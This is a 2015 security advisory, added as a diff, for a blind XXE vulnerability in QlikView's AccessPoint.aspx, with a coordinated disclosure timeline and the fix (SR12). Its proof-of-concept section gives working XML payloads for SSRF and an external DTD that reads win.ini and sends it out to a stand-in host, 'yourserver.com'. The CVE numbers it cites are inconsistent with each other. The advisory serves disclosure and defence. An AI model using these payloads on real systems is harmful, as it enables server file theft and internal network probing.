@@ -1,0 +1,99 @@
+Exploit Title: Qlikview blind XXE security vulnerability
+Product: Qlikview
+Vulnerable Versions: v11.20 SR11 and previous versions
+Tested Version: v11.20 SR4
+Advisory Publication: 08/09/2015
+Latest Update: 08/09/2015
+Vulnerability Type: Improper Restriction of XML External Entity Reference [CWE-611]
+CVE Reference: CVE-2015-3623
+Credit: Alex Haynes
+
+Advisory Details:
+
+
+(1) Vendor & Product Description
+--------------------------------
+
+Vendor: QLIK
+
+Product & Version:
+QlikView v11.20 SR4
+
+Vendor URL & Download:
+http://www.qlik.com/us/explore/products/qlikview
+
+Product Description:
+"The QlikView Business Discovery platform delivers true self-service BI that empowers business users by driving innovative decision-making."
+
+
+(2) Vulnerability Details:
+--------------------------
+The Qlikview platform is vulnerable to XML External Entity (XXE) vulnerabilities. More specifically, the platform
+is susceptible to DTD parameter injections, which are also "blind" as the server feeds back no visual response. These vulnerabilities can be exploited
+to force Server Side Request Forgeries (SSRF)in multiple protocols, as well as reading and extracting arbitrary files on the server directly.
+
+Proof of concept for XXE [CVE-2015-5361]:
+-----------------------------------------
+URL: https://<QLIKVIEW>/AccessPoint.aspx
+
+Attack Pattern for SSRF: 
+------------------------
+In POST body:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE update [
+<!ENTITY % external SYSTEM "http://yourserver.com">
+%external;]>
+
+OR simply 
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE roottag PUBLIC "-//WHITE//NINJA//EN" "http://yourserver.com">
+
+As this is a blind XXE, you will see no response from server, but yourserver.com will receive the HTTP request from the Qlikview server. Also works with FTP and HTTPS protocols.
+
+Attack Pattern for reading and extracting arbitrary files: 
+------------------------------------------
+In POST body:
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE roottag [
+<!ENTITY % remote SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % dtd SYSTEM "http://yourserver.com/test.dtd">
+%dtd;
+%send;
+]]>
+
+The test.dtd file on yourserver.com will need to contain the following:
+
+Test.dtd
+--------
+<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://yourserver.com/?%remote;'>">
+%all;
+
+As the response is blind, you will see no response from the server, but yourserver.com will receive the file contents as part of the URL in lieu of the %remote parameter.
+
+
+(3) Advisory Timeline:
+----------------------
+29/04/2015 - First Contact informing vendor of vulnerability
+30/04/2015 - Response requesting details of vulnerability. Details sent
+05/05/2015 - Vendor indicates issue is under investigation.
+06/05/2015 - Vendor confirms vulnerability and has started working on resolving the issue.
+20/05/2015 - Vendor confirms root cause has been identified and patch is under internal testing.
+08/06/2015 - Vendor confirms patch ready and requests 90 day restraint on vulnerability release to give clients time to patch.
+10/06/2015 - Patch 11.20 SR12 released, fixing the vulnerability
+08/09/2015 - Public disclosure of vulnerability.
+
+
+(4)Solution:
+------------
+Upgrade to QV11.20 SR12 will correct the vulnerability.
+
+
+(5) Credits:
+------------
+Discovered by Alex Haynes
+
+References:
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3623
+http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-3623
